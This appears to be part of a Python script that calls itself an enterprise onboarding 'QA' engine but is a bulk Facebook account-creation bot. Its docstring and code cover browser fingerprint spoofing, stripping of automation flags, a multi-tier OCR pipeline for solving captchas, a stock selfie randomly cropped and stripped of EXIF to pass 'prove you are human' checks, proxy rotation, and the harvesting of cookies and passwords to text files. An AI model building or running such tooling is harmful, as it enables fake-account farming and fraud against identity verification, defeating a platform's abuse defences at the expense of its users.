#!/usr/bin/env python3
"""
fbacc_pro.py - EYDHM :: Enterprise E2E User-Onboarding QA Automation & Resilience Engine
Branding: EYDHM · Architecture: Async EventBus Telemetry · Real-Time Transparent Event Logging

Speed Tier SLA:
- Instant Mode  : Ultra-fast execution (<=15s per task) via non-blocking strategy=none,
                  parallel asset abortion, and atomic JS setter dispatch.
- Fast Mode     : Accelerated execution (~20s per task) with eager DOM loading and tight polling.
- Normal Mode   : Human-cadence execution (within 1 min, ~45s-55s per task) with natural pauses and typing jitter.

Core Architectural Modules:
1. Hierarchical Interactive CLI & Batch Ingestion Engine:
   - Clean, nested CLI menus: Phone, Email, Mix Mode, Settings, Exit
   - Smart phone detection from files (.txt, .csv, .json via phonenumbers library)
   - Dynamic 90% Email mode (concludes upon reaching OTP screen without immediate code submission)
   - Persistent settings manager (settings.json) with interactive KYC image URL verification
2. Post-Creation Credential Login Verification Test:
   - Navigates to limited.facebook.com to verify created credentials (c_user/email/phone + password)
   - Strict "Save for later login" handler: ALWAYS clicks "Not Now", NEVER clicks "OK"
   - Evaluates resulting DOM: OTP screen / Home Feed (Valid) vs Login Error (LOGIN TEST FAILED ⚠️)
3. Anti-Detection & Stealth Layer (Faker & Fingerprint Masking):
   - Dynamic profile generation via Faker (first/last names, DOB distribution 1984-2004)
   - Automation flag stripping (navigator.webdriver, WebGL spoofing, User-Agent rotation)
   - Human-like typing cadence with randomized micro-delays
4. Dual-Mode DOM State Machine (Limited FB & Standard Web):
   - Limited Facebook edition multi-step wizard (Steps 1-5: Names -> DOB -> Contact -> Gender -> Password)
   - Standard Web single-step registration fallback
   - Continuous interruption sweeper (cookie banners, "Save for later login" -> "Not Now" / "Skip")
   - DOM error detection ("Already Registered" detection with multiple accounts warning)
5. Multi-Tiered Cascading OCR & Challenge Resolution:
   - Primary: Tesseract OCR with image enhancement and confidence scoring
   - Secondary: New captcha reload / retry
   - Tertiary: PaddleOCR fallback (2 attempts)
   - Quaternary: Hugging Face TrOCR (microsoft/trocr-base-printed)
   - Background "Prove you are human" selfie appeal using EXIF-sanitized Pillow RGB buffer
6. Completion Barrier & Secure Credential Harvesting:
   - OTP screen detection (maxlength=6, "Enter the code", /checkpoint, /confirmemail.php)
   - Instant credential harvesting (raw cookies JSON/Netscape, c_user ID, password, duration)
   - Real-time Graph API profile liveness check (https://graph.facebook.com/{c_user}/picture)
   - Persistent recording to phone_accounts.txt and accounts_log.txt
7. Termux Environment Optimizations & QA Protocol:
   - Zombie browser cleanup between runs (kill_zombie_browsers)
   - Built-in dry-run mode (--dry-run) simulating full state transitions
   - Built-in unit test suite (--test) verifying parsing, faker, image sanitization, and output pipelines
"""

import sys
import os
import re
import io
import time
import json
import random
import string
import inspect
import datetime
import argparse
import tempfile
import shutil
import asyncio
import subprocess
from typing import Optional, Dict, Any, List, Tuple, Set

# Terminal Color Constants (24-bit TrueColor Palette)
C_RESET = "\033[0m"
C_BOLD = "\033[1m"
C_DIM = "\033[2m"
C_CLEAR = "\033[2J\033[H"
G0 = "\033[38;2;190;250;210m"  # Highlight Mint (#BEFAD2)
G1 = "\033[38;2;130;240;175m"  # Bright Seafoam (#82F0AF)
G2 = "\033[38;2;74;222;128m"   # Cyber Emerald (#4ADE80)
G3 = "\033[38;2;34;197;94m"    # Toxic Green (#22C55E)
G4 = "\033[38;2;22;140;66m"    # Deep Jade (#168C42)
G5 = "\033[38;2;14;82;40m"     # Shadow Forest (#0E5228)
WHITE = "\033[38;2;245;245;250m"
GRAY = "\033[38;2;115;115;125m"
CYAN = "\033[38;2;56;189;248m"
AMBER = "\033[38;2;245;158;11m"
ROSE = "\033[38;2;244;63;94m"

IS_ANDROID = sys.platform.startswith("android") or "com.termux" in os.environ.get("PREFIX", "")
HF_API_TOKEN = os.environ.get("HF_API_TOKEN", "")
DEFAULT_SELFIE_URL = "https://i.ibb.co.com/jkJ9cNZf/IMG-8bdbd8b0.jpg"

ENDPOINT_PROFILES = {
    "limited": "https://limited.facebook.com/reg",
    "limited_home": "https://limited.facebook.com",
    "web": "https://www.facebook.com/r.php",
    "mobile": "https://m.facebook.com/reg",
    "mbasic": "https://mbasic.facebook.com/reg",
    "free": "https://free.facebook.com/reg",
    "beta": "https://beta.facebook.com/r.php",
    "dev": "https://developers.facebook.com"
}

# ==============================================================================
# Auto-Dependency Management
# ==============================================================================

def ensure_dependencies():
    """Verify runtime dependencies and install if missing via doctor module or embedded fallback."""
    try:
        from doctor import run_doctor
        # Run auto-healing doctor silently for regular runs (prints only if missing packages need repair)
        run_doctor(auto_repair=True, quiet=True)
        return
    except Exception:
        pass

    packages = {
        "requests": "requests",
        "faker": "faker",
        "selenium": "selenium",
        "rich": "rich",
        "websockets": "websockets",
        "aiohttp": "aiohttp",
        "PIL": "Pillow",
        "pytesseract": "pytesseract",
        "phonenumbers": "phonenumbers",
        "fake_useragent": "fake-useragent",
        "cryptography": "cryptography"
    }
    missing = []
    for mod, pkg in packages.items():
        try:
            __import__(mod)
        except ImportError:
            missing.append(pkg)

    if missing:
        print(f"{AMBER}[*] Resolving runtime dependencies: {', '.join(missing)}{C_RESET}")
        pip_args = [sys.executable, "-m", "pip", "install"]
        if sys.version_info >= (3, 11):
            pip_args.append("--break-system-packages")
        for pkg in missing:
            try:
                subprocess.check_call(pip_args + [pkg], stdout=subprocess.DEVNULL)
            except Exception:
                try:
                    subprocess.check_call([sys.executable, "-m", "pip", "install", pkg], stdout=subprocess.DEVNULL)
                except Exception:
                    pass

    # System binaries: tesseract and chromium
    if not shutil.which("tesseract"):
        if IS_ANDROID and shutil.which("pkg"):
            try: subprocess.run(["pkg", "install", "-y", "tesseract"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            except Exception: pass
        elif shutil.which("apt-get"):
            try:
                subprocess.run(["apt-get", "update", "-y"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                subprocess.run(["apt-get", "install", "-y", "tesseract-ocr"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            except Exception: pass
        elif shutil.which("pacman"):
            try: subprocess.run(["pacman", "-S", "--noconfirm", "tesseract"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            except Exception: pass
        elif shutil.which("dnf"):
            try: subprocess.run(["dnf", "install", "-y", "tesseract"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            except Exception: pass

    has_chromium = any(shutil.which(b) for b in ("chromium-browser", "chromium", "google-chrome-stable", "google-chrome", "chrome"))
    if not has_chromium and not os.path.isfile("/data/data/com.termux/files/usr/bin/chromium-browser"):
        if IS_ANDROID and shutil.which("pkg"):
            try: subprocess.run(["pkg", "install", "-y", "chromium"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            except Exception: pass
        elif shutil.which("apt-get"):
            try: subprocess.run(["apt-get", "install", "-y", "chromium-browser", "chromium-chromedriver"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            except Exception: pass
        elif shutil.which("pacman"):
            try: subprocess.run(["pacman", "-S", "--noconfirm", "chromium"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            except Exception: pass
        elif shutil.which("dnf"):
            try: subprocess.run(["dnf", "install", "-y", "chromium", "chromedriver"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            except Exception: pass


if not any(arg in sys.argv for arg in ("-h", "--help")):
    ensure_dependencies()

try:
    import requests
    import aiohttp
    import websockets
    from rich.console import Console
    from rich.panel import Panel
    from rich.table import Table
    from rich.text import Text
    from rich.live import Live
    from PIL import Image, ImageOps, ImageFilter
except ImportError:
    pass

try:
    from faker import Faker
    _FAKER_AVAILABLE = True
except ImportError:
    _FAKER_AVAILABLE = False

try:
    import phonenumbers
    _PHONENUMBERS_AVAILABLE = True
except ImportError:
    _PHONENUMBERS_AVAILABLE = False


# ==============================================================================
# Persistent Settings Manager (settings.json)
# ==============================================================================

class SettingsManager:
    """Manages persistent configuration across runs."""
    SETTINGS_FILE = "settings.json"
    DEFAULTS = {
        "default_password": None,
        "default_mode": "ultra",
        "default_endpoint": "limited",
        "kyc_image_url": DEFAULT_SELFIE_URL,
        "proxy": None,
        "proxy_pool": [],
        "proxy_routing": {
            "opt5": "disabled",
            "opt6": "disabled",
            "opt7": "disabled",
            "opt1": "disabled",
            "opt3": "disabled"
        },
        "delay": 1.0,
        "email_provider": "tempmail_lol"
    }

    @classmethod
    def load(cls) -> Dict[str, Any]:
        if os.path.isfile(cls.SETTINGS_FILE):
            try:
                with open(cls.SETTINGS_FILE, "r", encoding="utf-8") as f:
                    data = json.load(f)
                    res = {**cls.DEFAULTS, **data}
                    if "proxy_routing" not in res or not isinstance(res["proxy_routing"], dict):
                        res["proxy_routing"] = cls.DEFAULTS["proxy_routing"].copy()
                    else:
                        res["proxy_routing"] = {**cls.DEFAULTS["proxy_routing"], **res["proxy_routing"]}
                    return res
            except Exception:
                pass
        return cls.DEFAULTS.copy()

    @classmethod
    def save(cls, data: Dict[str, Any]):
        try:
            with open(cls.SETTINGS_FILE, "w", encoding="utf-8") as f:
                json.dump(data, f, indent=2)
        except Exception:
            pass

    @classmethod
    def update_key(cls, key: str, value: Any):
        cfg = cls.load()
        cfg[key] = value
        cls.save(cfg)
        return cfg


def _format_cookies_single_line(ck: str, max_len: int = 35) -> str:
    """Format cookie string to single line with truncation/ellipsis for clean terminal display."""
    if not ck or ck in ("N/A", "None", ""):
        return "N/A"
    clean = re.sub(r"[\r\n\t]+", " ", str(ck)).strip()
    if len(clean) > max_len:
        return clean[:max_len - 3] + "..."
    return clean


def smart_update_reco_sms(phone: str, status: str = "RECO SMS SENT ✅") -> int:
    r"""
    Smartly updates reco_sms.txt in place:
    If a line for (phone) already exists, increments 'reco sms sent (\d+)x' to (count + 1)x
    and updates the timestamp.
    If no record exists, appends 'reco sms sent 1x to ({phone}) · {timestamp} · Status: {status}'.
    Returns the new round count (e.g. 1, 2, ..., N).
    """
    file_path = "reco_sms.txt"
    raw_digits = re.sub(r"\D", "", phone)
    now_str = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    new_count = 1
    lines = []
    found_idx = -1

    if os.path.isfile(file_path):
        try:
            with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
                lines = f.readlines()
        except Exception:
            lines = []

    # Find existing entry for this phone
    for idx, l in enumerate(lines):
        m = re.search(r"reco sms sent (\d+)x to \(([^\)]+)\)", l)
        if m:
            entry_digits = re.sub(r"\D", "", m.group(2))
            if (raw_digits and entry_digits and (entry_digits == raw_digits or raw_digits.endswith(entry_digits) or entry_digits.endswith(raw_digits))):
                prev_cnt = int(m.group(1))
                new_count = prev_cnt + 1
                found_idx = idx
                break

    new_line = f"reco sms sent {new_count}x to ({phone}) · {now_str} · Status: {status}\n"
    if found_idx >= 0:
        lines[found_idx] = new_line
    else:
        lines.append(new_line)

    try:
        with open(file_path, "w", encoding="utf-8") as f:
            f.writelines(lines)
    except Exception:
        pass

    return new_count


# ==============================================================================
# Binary Locators & Process Management
# ==============================================================================

def get_chromium_binary() -> Optional[str]:
    candidates = [
        "/data/data/com.termux/files/usr/bin/chromium-browser",
        "/data/data/com.termux/files/usr/bin/chromium",
        "chromium-browser",
        "chromium",
        "google-chrome-stable",
        "google-chrome",
        "chrome",
        "/usr/bin/chromium-browser",
        "/usr/bin/chromium",
        "/usr/bin/google-chrome"
    ]
    for c in candidates:
        p = shutil.which(c) if not os.path.isabs(c) else c
        if p and os.path.isfile(p) and os.access(p, os.X_OK):
            return p
    return None


def get_chromedriver_binary() -> Optional[str]:
    candidates = [
        "/data/data/com.termux/files/usr/bin/chromedriver",
        "chromedriver",
        "/usr/bin/chromedriver",
        "/usr/local/bin/chromedriver"
    ]
    for c in candidates:
        p = shutil.which(c) if not os.path.isabs(c) else c
        if p and os.path.isfile(p) and os.access(p, os.X_OK):
            return p
    return None


def kill_zombie_browsers():
    """Clean up orphaned chromium and chromedriver processes to prevent memory leaks and port collisions."""
    try:
        if IS_ANDROID or sys.platform.startswith("linux"):
            for proc_name in ("chromedriver", "chromium-browser", "chromium", "chrome"):
                try:
                    subprocess.run(["pkill", "-9", "-f", proc_name], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                except Exception:
                    pass
    except Exception:
        pass


def create_resilient_driver(options: Any, headless: bool = True) -> Any:
    """
    Creates and launches a Selenium WebDriver instance with multi-tier retry,
    dynamic port binding (port=0), environment sanitization (TMPDIR), and automatic crash recovery.
    """
    from selenium import webdriver
    from selenium.webdriver.chrome.service import Service

    # Termux Android TMPDIR safety
    if IS_ANDROID or os.path.exists("/data/data/com.termux"):
        termux_tmp = "/data/data/com.termux/files/usr/tmp"
        os.environ["TMPDIR"] = termux_tmp
        try:
            os.makedirs(termux_tmp, exist_ok=True)
        except Exception:
            pass

    chrome_bin = get_chromium_binary()
    chromedriver_bin = get_chromedriver_binary()

    if chrome_bin and (not hasattr(options, "binary_location") or not options.binary_location):
        options.binary_location = chrome_bin

    # Ensure baseline sandbox/shm/port flags
    baseline_args = [
        "--no-sandbox",
        "--disable-dev-shm-usage",
        "--disable-gpu",
        "--remote-debugging-port=0"
    ]
    for arg in baseline_args:
        if arg not in options.arguments:
            options.add_argument(arg)

    last_exc = None

    # Tier 1: Launch with dynamic port (port=0) and silenced log output
    try:
        service = Service(executable_path=chromedriver_bin, port=0, log_output=subprocess.DEVNULL) if chromedriver_bin else Service(port=0, log_output=subprocess.DEVNULL)
        driver = webdriver.Chrome(service=service, options=options)
        return driver
    except Exception as e:
        last_exc = e
        write_runtime_log("DRIVER", "RETRY", f"Tier 1 ChromeDriver launch failed: {e}. Executing zombie cleanup and fallback tier...")

    # Tier 2: Kill zombies, switch headless mode, and retry
    kill_zombie_browsers()
    time.sleep(0.5)

    try:
        # If --headless=new failed on older kernel or specialized driver, fallback to classic --headless or adjust flags
        opts_t2 = options
        if "--headless=new" in opts_t2.arguments:
            opts_t2.arguments.remove("--headless=new")
            opts_t2.add_argument("--headless")
        if "--single-process" not in opts_t2.arguments and (IS_ANDROID or os.path.exists("/data/data/com.termux")):
            opts_t2.add_argument("--single-process")
        if "--disable-setuid-sandbox" not in opts_t2.arguments:
            opts_t2.add_argument("--disable-setuid-sandbox")

        service = Service(executable_path=chromedriver_bin, port=0, log_output=subprocess.DEVNULL) if chromedriver_bin else Service(port=0, log_output=subprocess.DEVNULL)
        driver = webdriver.Chrome(service=service, options=opts_t2)
        return driver
    except Exception as e:
        last_exc = e
        write_runtime_log("DRIVER", "RETRY", f"Tier 2 ChromeDriver launch failed: {e}. Trying system PATH fallback...")

    # Tier 3: Launch without explicit chromedriver_bin path (let Selenium / Selenium Manager resolve)
    try:
        service = Service(port=0, log_output=subprocess.DEVNULL)
        driver = webdriver.Chrome(service=service, options=options)
        return driver
    except Exception as e:
        last_exc = e

    err_msg = (
        f"Chromium/ChromeDriver failed to launch across all 3 resilience tiers.\n"
        f"Details: {last_exc}\n"
        f"Hint for Termux/Linux: Run 'fbacc doctor' to reinstall chromium or ensure x11/tur-repo is updated."
    )
    raise RuntimeError(err_msg) from last_exc


# ==============================================================================
# Transparent EventBus & Real-Time Detailed Terminal Logger
# ==============================================================================

class EventBus:
    """Central Asynchronous EventBus broadcasting to stdout & local WebSocket server."""

    def __init__(self, port: int = 8765):
        self.port = port
        self.actual_port = port
        self.clients: Set[Any] = set()
        self.listeners = []
        self.server = None

    async def start(self):
        for p in range(self.port, self.port + 10):
            try:
                self.server = await websockets.serve(self._ws_handler, "127.0.0.1", p)
                self.actual_port = p
                break
            except OSError:
                continue
            except Exception:
                break

    async def _ws_handler(self, websocket):
        self.clients.add(websocket)
        try:
            await websocket.wait_closed()
        finally:
            self.clients.discard(websocket)

    def subscribe(self, callback):
        self.listeners.append(callback)

    async def emit(self, step_name: str, payload: Dict[str, Any]):
        now = datetime.datetime.now().strftime("%H:%M:%S")
        event = {
            "step": step_name,
            "timestamp": time.time(),
            "time_str": now,
            "datetime": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S.%f")[:-3],
            **payload
        }
        if self.clients:
            msg = json.dumps(event)
            dead = set()
            for ws in self.clients:
                try:
                    await ws.send(msg)
                except Exception:
                    dead.add(ws)
            self.clients.difference_update(dead)

        for l in self.listeners:
            try:
                if inspect.iscoroutinefunction(l):
                    await l(step_name, event)
                else:
                    l(step_name, event)
            except Exception:
                pass

    async def stop(self):
        if self.server:
            self.server.close()
            try:
                await self.server.wait_closed()
            except Exception:
                pass


RUNTIME_DEBUG_LOG = "runtime_debug.log"


def write_runtime_log(level: str, category: str, detail: str):
    """Real-time diagnostic append to runtime_debug.log for live execution monitoring."""
    try:
        now_str = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S.%f")[:-3]
        line = f"[{now_str}] [{level.upper():<7}] [{category:<14}] {detail}\n"
        with open(RUNTIME_DEBUG_LOG, "a", encoding="utf-8") as f:
            f.write(line)
            f.flush()
    except Exception:
        pass


def get_safe_current_url(driver) -> str:
    """Safely obtain current URL without throwing if browser is navigating or document is unready."""
    if not driver:
        return ""
    try:
        url = driver.current_url
        return url or ""
    except Exception:
        try:
            return driver.execute_script("return window.location.href || '';") or ""
        except Exception:
            return ""


def get_safe_body_text(driver) -> str:
    """Safely extract body text from Selenium driver without throwing NoSuchElementException or StaleElementReferenceException."""
    if not driver:
        return ""
    try:
        txt = driver.execute_script("return (document.body && (document.body.innerText || document.body.textContent)) || '';")
        if txt and isinstance(txt, str):
            return txt
    except Exception:
        pass
    try:
        from selenium.webdriver.common.by import By
        el = driver.find_element(By.TAG_NAME, "body")
        return el.text or ""
    except Exception:
        return ""


def drain_stdin():
    """Drain any residual unread characters or pasted newlines from sys.stdin."""
    import select
    try:
        while True:
            rlist, _, _ = select.select([sys.stdin], [], [], 0.0)
            if rlist:
                line = sys.stdin.readline()
                if not line: break
            else:
                break
    except Exception:
        pass


def read_input_with_multiline_paste(prompt_str: str) -> str:
    """
    Read user input from stdin, draining any simultaneous multi-line pasted text
    from the clipboard into a single unified multi-line string.
    """
    import select
    try:
        drain_stdin()
        sys.stdout.write(prompt_str)
        sys.stdout.flush()
        first_line = sys.stdin.readline()
        if not first_line:
            return ""
        lines = [first_line.rstrip("\r\n")]
        while True:
            try:
                rlist, _, _ = select.select([sys.stdin], [], [], 0.25)
                if rlist:
                    extra = sys.stdin.readline()
                    if not extra:
                        break
                    lines.append(extra.rstrip("\r\n"))
                else:
                    break
            except Exception:
                break
        drain_stdin()
        clean_lines = [l.strip() for l in lines if l.strip()]
        return "\n".join(clean_lines).strip()
    except Exception:
        try:
            return input(prompt_str).strip()
        except Exception:
            return ""


def _extract_radio_context(driver, r) -> str:
    """Extract full textual context surrounding a radio button or option element without bleeding into sibling options."""
    parts = []

    def _get_txt(el):
        if not el: return ""
        try:
            t = (el.text or "").strip()
            if not t:
                t = (el.get_attribute("innerText") or "").strip()
            if not t:
                t = (el.get_attribute("textContent") or "").strip()
            return t
        except Exception:
            return ""

    # 1. Element's own text and attributes
    txt = _get_txt(r)
    if txt: parts.append(txt)
    for attr in ("aria-label", "value", "id", "name", "title", "data-sigil"):
        try:
            val = r.get_attribute(attr)
            if val: parts.append(val)
        except Exception:
            pass

    # 2. Associated <label for="...">
    r_id = r.get_attribute("id") if hasattr(r, "get_attribute") else None
    if r_id:
        try:
            from selenium.webdriver.common.by import By
            labels = driver.find_elements(By.CSS_SELECTOR, f"label[for='{r_id}']")
            for l in labels:
                lt = _get_txt(l)
                if lt: parts.append(lt)
        except Exception:
            pass

    # 3. Ancestors: only ascend while container belongs EXCLUSIVELY to this option
    try:
        from selenium.webdriver.common.by import By
        curr = r
        for _ in range(4):
            curr = curr.find_element(By.XPATH, "..")
            tag = curr.tag_name.lower()
            if tag in ("form", "body", "html", "table"):
                break
            # If ancestor contains multiple radio inputs, it's a shared container (e.g. tbody, fieldset, form)
            other_radios = curr.find_elements(By.CSS_SELECTOR, "input[type='radio'], div[role='radio']")
            if len(other_radios) > 1:
                break
            ancestor_txt = _get_txt(curr)
            if ancestor_txt:
                parts.append(ancestor_txt)
    except Exception:
        pass

    # 4. Immediate siblings within the exclusive cell or row
    try:
        from selenium.webdriver.common.by import By
        sibs = r.find_elements(By.XPATH, "following-sibling::* | preceding-sibling::*")
        for s in sibs[:5]:
            # Do not inspect sibling if it contains another radio
            if s.find_elements(By.CSS_SELECTOR, "input[type='radio'], div[role='radio']"):
                continue
            st = _get_txt(s)
            if st: parts.append(st)
    except Exception:
        pass

    return " ".join(parts).lower()


def print_log_line(step: str, detail: str, level: str = "INFO"):
    """Render a clean, high-visibility, real-time log event with timestamp."""
    write_runtime_log(level, step, detail)
    now = datetime.datetime.now().strftime("%H:%M:%S")
    color_map = {
        "INFO": (CYAN, G1),
        "SUCCESS": (G3, G0),
        "WARN": (AMBER, WHITE),
        "ERROR": (ROSE, WHITE),
        "ACTION": (G2, WHITE),
        "STEP": (G0, G1)
    }
    tag_col, txt_col = color_map.get(level, (CYAN, WHITE))
    print(f"   {GRAY}[{now}]{C_RESET} {tag_col}{C_BOLD}[{step}]{C_RESET} {txt_col}{detail}{C_RESET}", flush=True)


def print_stage_log(total: int, current: int, detail: str, emoji: str = "🌠"):
    """
    Render clean, beautifully aligned terminal stage logs matching user specification:
    {total}/{current} 🌠 {detail}
    """
    write_runtime_log("STAGE", f"{total}/{current}", detail)
    prefix = f"{total}/{current} {emoji}"
    print(f" {prefix} {detail}", flush=True)



def render_account_card(rec: Dict[str, Any]):
    """Print structured table of created/recovered account with cookies without terminal line break mess."""
    try:
        console = Console()
        t = Table(border_style="#168C42", show_header=False)
        t.add_column("Field", style="bold #82F0AF", width=14)
        t.add_column("Value", style="white")
        t.add_row("Status", rec.get("status", "N/A"))
        t.add_row("User / ID", f"{rec.get('c_user', 'N/A')} ({rec.get('contact', 'N/A')})")
        t.add_row("Password", str(rec.get("password", "N/A")))
        t.add_row("Duration", f"{rec.get('time_taken', 0.0)}s")
        raw_c = rec.get("cookies", "")
        t.add_row("Cookies", raw_c[:140] + ("..." if len(raw_c) > 140 else ""))
        console.print(t)
    except Exception:
        pass


# ==============================================================================
# Multi-Tiered Cascading OCR Regression Pipeline
# ==============================================================================

class MultiTierOCR:
    """
    Cascading OCR Pipeline:
    1. Primary Tier: Tesseract OCR (pytesseract) with image enhancement and confidence scoring.
    2. Secondary Retry: Refresh/New captcha attempt with image filter optimization.
    3. Tertiary Tier: PaddleOCR fallback (2 attempts).
    4. Quaternary Tier: HuggingFace Inference API (microsoft/trocr-base-printed).
    """

    @classmethod
    async def resolve(cls, image_bytes: bytes) -> Tuple[Optional[str], str, float]:
        """Returns (resolved_text, source_tier, confidence_score)."""
        img = Image.open(io.BytesIO(image_bytes)).convert("L")

        # Tier 1: Pytesseract with confidence scoring
        try:
            text, conf = await asyncio.to_thread(cls._run_tesseract_with_confidence, img)
            if text and len(text) >= 4 and conf >= 0.70:
                return text, "Primary Tier (Tesseract)", conf
            elif text and len(text) >= 4:
                tier1_candidate = (text, conf)
            else:
                tier1_candidate = None
        except Exception:
            tier1_candidate = None

        # Tier 2: Enhanced Tesseract Retry
        try:
            enhanced = ImageOps.equalize(img)
            text_r, conf_r = await asyncio.to_thread(cls._run_tesseract_with_confidence, enhanced)
            if text_r and len(text_r) >= 4 and conf_r >= 0.75:
                return text_r, "Secondary Tier (Enhanced Tesseract)", conf_r
        except Exception:
            pass

        # Tier 3: PaddleOCR fallback (2 attempts)
        for attempt in (1, 2):
            try:
                text_p, conf_p = await asyncio.to_thread(cls._run_paddleocr, image_bytes)
                if text_p and len(text_p) >= 4 and conf_p >= 0.70:
                    return text_p, f"Tertiary Tier (PaddleOCR #{attempt})", conf_p
            except Exception:
                pass

        # Tier 4: HuggingFace Inference API (microsoft/trocr-base-printed)
        try:
            text_hf = await cls._run_huggingface_trocr(image_bytes, timeout_sec=8.0)
            if text_hf and len(text_hf) >= 4:
                return text_hf, "Quaternary Tier (HuggingFace TrOCR)", 0.95
        except Exception:
            pass

        if tier1_candidate:
            return tier1_candidate[0], "Primary Tier (Low Confidence)", tier1_candidate[1]

        return None, "All Tiers Exhausted", 0.0

    @staticmethod
    def _run_tesseract_with_confidence(img: Image.Image) -> Tuple[Optional[str], float]:
        try:
            import pytesseract
            from pytesseract import Output
            enhanced = ImageOps.autocontrast(img)
            enhanced = enhanced.filter(ImageFilter.SHARPEN)

            data = pytesseract.image_to_data(
                enhanced,
                output_type=Output.DICT,
                config="--psm 8 -c tessedit_char_whitelist=ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
            )

            confs = []
            words = []
            for conf_val, text_val in zip(data.get("conf", []), data.get("text", [])):
                if str(conf_val) != "-1" and text_val.strip():
                    try:
                        c_num = float(conf_val)
                        if c_num >= 0:
                            confs.append(c_num)
                            words.append(text_val.strip())
                    except ValueError:
                        pass

            raw_txt = "".join(words)
            clean_txt = re.sub(r"[^A-Za-z0-9]", "", raw_txt)
            mean_conf = (sum(confs) / len(confs) / 100.0) if confs else 0.0
            return (clean_txt if clean_txt else None, mean_conf)
        except Exception:
            return None, 0.0

    @staticmethod
    def _run_paddleocr(image_bytes: bytes) -> Tuple[Optional[str], float]:
        from paddleocr import PaddleOCR
        ocr = PaddleOCR(use_angle_cls=True, lang="en", show_log=False)
        result = ocr.ocr(image_bytes, cls=True)
        texts = []
        confs = []
        if result and isinstance(result, list):
            for line in result:
                if not line: continue
                for item in line:
                    if len(item) >= 2 and isinstance(item[1], (tuple, list)):
                        txt, score = item[1]
                        clean = re.sub(r"[^A-Za-z0-9]", "", txt)
                        if clean:
                            texts.append(clean)
                            confs.append(float(score))
        joined = "".join(texts)
        mean_conf = (sum(confs) / len(confs)) if confs else 0.0
        return (joined if joined else None, mean_conf)

    @staticmethod
    async def _run_huggingface_trocr(image_bytes: bytes, timeout_sec: float = 8.0) -> Optional[str]:
        if not HF_API_TOKEN:
            return None
        url = "https://api-inference.huggingface.co/models/microsoft/trocr-base-printed"
        headers = {"Authorization": f"Bearer {HF_API_TOKEN}"}
        timeout = aiohttp.ClientTimeout(total=timeout_sec)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.post(url, headers=headers, data=image_bytes) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    if isinstance(data, list) and len(data) > 0:
                        raw = data[0].get("generated_text", "")
                        clean = re.sub(r"[^A-Za-z0-9]", "", raw)
                        return clean if len(clean) >= 4 else None
        return None


# ==============================================================================
# Virtual Media Stream & Sanitized Asset Upload
# ==============================================================================

class MediaInjectionService:
    """KYC & Avatar upload test mechanisms with synthetic Y4M & EXIF sanitized JPEG buffer."""

    Y4M_PATH = os.path.abspath("synthetic_camera.y4m")
    SANITIZED_IMAGE_PATH = os.path.abspath("sanitized_selfie.jpg")

    @classmethod
    def ensure_synthetic_y4m(cls, width: int = 320, height: int = 240, frames: int = 30) -> str:
        if os.path.isfile(cls.Y4M_PATH) and os.path.getsize(cls.Y4M_PATH) > 100000:
            return cls.Y4M_PATH

        header = f"YUV4MPEG2 W{width} H{height} F30:1 Ip A1:1 C420jpeg\n".encode("ascii")
        frame_header = b"FRAME\n"
        y_plane = b"\x80" * (width * height)
        u_plane = b"\x80" * (width * height // 4)
        v_plane = b"\x80" * (width * height // 4)

        with open(cls.Y4M_PATH, "wb") as f:
            f.write(header)
            for _ in range(frames):
                f.write(frame_header + y_plane + u_plane + v_plane)
        return cls.Y4M_PATH

    @classmethod
    def sanitize_image(cls, source_path_or_url: str) -> str:
        img = None
        if source_path_or_url.startswith("http"):
            try:
                r = requests.get(source_path_or_url, timeout=12)
                if r.status_code == 200:
                    img = Image.open(io.BytesIO(r.content))
            except Exception:
                img = None
        elif os.path.isdir(source_path_or_url):
            candidates = [os.path.join(source_path_or_url, f) for f in os.listdir(source_path_or_url) if f.lower().endswith((".jpg", ".png", ".jpeg"))]
            if candidates:
                img = Image.open(random.choice(candidates))
        elif os.path.isfile(source_path_or_url):
            img = Image.open(source_path_or_url)

        if not img:
            try:
                r = requests.get(DEFAULT_SELFIE_URL, timeout=12)
                img = Image.open(io.BytesIO(r.content))
            except Exception:
                img = Image.new("RGB", (640, 480), color=(180, 180, 180))

        img = img.convert("RGB")
        w, h = img.size
        crop_box = (random.randint(1, 2), random.randint(1, 2), max(10, w - random.randint(1, 2)), max(10, h - random.randint(1, 2)))
        img = img.crop(crop_box)

        clean_img = Image.new("RGB", img.size)
        clean_img.paste(img, (0, 0))
        clean_img.save(cls.SANITIZED_IMAGE_PATH, "JPEG", quality=92, exif=b"")
        return cls.SANITIZED_IMAGE_PATH

    @classmethod
    def test_and_cache_image_url(cls, url: str) -> Tuple[bool, str]:
        """Validate downloading image from URL, sanitize EXIF, and save to sanitized_selfie.jpg."""
        try:
            r = requests.get(url, timeout=10)
            if r.status_code != 200:
                return False, f"HTTP error {r.status_code}"
            img = Image.open(io.BytesIO(r.content))
            img.verify()
            # Reopen for saving
            img = Image.open(io.BytesIO(r.content)).convert("RGB")
            clean_img = Image.new("RGB", img.size)
            clean_img.paste(img, (0, 0))
            clean_img.save(cls.SANITIZED_IMAGE_PATH, "JPEG", quality=92, exif=b"")
            return True, "Image successfully validated and EXIF stripped."
        except Exception as e:
            return False, str(e)


# ==============================================================================
# Identity & Password Helpers
# ==============================================================================

MALE_NAMES = ["Liam", "Noah", "Oliver", "James", "Elijah", "William", "Henry", "Lucas", "Alexander", "Daniel", "Mateo", "Sebastian"]
FEMALE_NAMES = ["Olivia", "Emma", "Charlotte", "Amelia", "Sophia", "Ava", "Mia", "Evelyn", "Luna", "Harper", "Camila", "Gianna"]
